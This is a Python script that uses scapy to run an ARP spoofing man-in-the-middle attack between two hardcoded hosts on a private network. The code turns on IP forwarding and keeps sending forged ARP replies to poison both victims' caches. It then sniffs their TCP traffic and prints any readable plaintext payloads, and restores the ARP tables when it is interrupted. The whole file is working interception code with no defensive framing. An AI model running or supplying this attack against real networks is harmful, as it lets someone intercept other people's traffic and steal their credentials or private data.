import re
import os
import threading
import time
import signal
from scapy.all import sniff, IP, TCP, Ether, ARP, sendp, Raw


spoofing = True



def enable_forwarding():
    if os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") == 0:
        print("Packet forwarding enabled")
    else:
        print("Couldnt enable packet forwarding. Ending the program")
        exit()


def disable_forwarding():
    if os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") == 0:
        print("\nPacket forwarding disabled")
    else:
        print("Couldnt disable packet forwarding. Configure it manually and check permissions")
        exit()


def resolve():
    i = 10
    while i != 0:
        sendp(Ether(src=host_mac, dst=laptop_mac)/ARP(op=2, pdst=laptop_ip, psrc=host_ip, hwdst=laptop_mac), verbose=0)
        sendp(Ether(src=laptop_mac, dst=host_mac)/ARP(op=2, pdst=host_ip, psrc=laptop_ip, hwdst=host_mac), verbose=0) 
        print(i)
        i -= 1
        time.sleep(1)



def signal_handler(sig, frame):
    global spoofing
    spoofing = False
    print("\n[!]Keyboard interrupt detected. Stopping spoofing and resolving ARP tables.")
    resolve()
    disable_forwarding()
    print("[!] Cleanup completed. Shutting down")
    exit(0)


attacker_mac = "08:00:27:e7:01:8a"
laptop_mac = "00:e0:4c:68:17:2e"
host_mac = "3c:7c:3f:2a:b4:d1"
host_ip = "10.0.0.8"
laptop_ip = "10.0.0.10"


def spoof():
    global spoofing
    print("[*] ARP spoofing started. Press Ctrl+C to stop.")
    while spoofing:
        sendp(Ether(src=attacker_mac, dst=laptop_mac)/ARP(op=2, pdst=laptop_ip, psrc=host_ip, hwdst=laptop_mac), verbose=0)
        sendp(Ether(src=attacker_mac, dst=host_mac)/ARP(op=2, pdst=host_ip, psrc=laptop_ip, hwdst=host_mac), verbose=0)
        time.sleep(1)


def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and not packet.haslayer(ARP):
        src_ip = packet[IP].src
        src_mac = packet[Ether].src
        
        if src_mac != attacker_mac:
            if src_ip == laptop_ip or src_ip == host_ip:
                if packet.haslayer(Raw):
                    try:
                        payload = packet[Raw].load.decode("utf-8", errors="ignore")
                        
                        if re.match("^[\x20-\x7E]*$", payload):
                            print(f"{src_ip}: {payload}")
                    
                    except Exception as e:
                        print(f"Error decoding payload from {src_ip}: {e}")


def main():

    
    signal.signal(signal.SIGINT, signal_handler)

    enable_forwarding()

    spoof_thread = threading.Thread(target=spoof)
    spoof_thread.daemon = True
    spoof_thread.start()

    sniff(prn=packet_callback, store=0, filter="not arp")


if __name__ == "__main__":
    main()
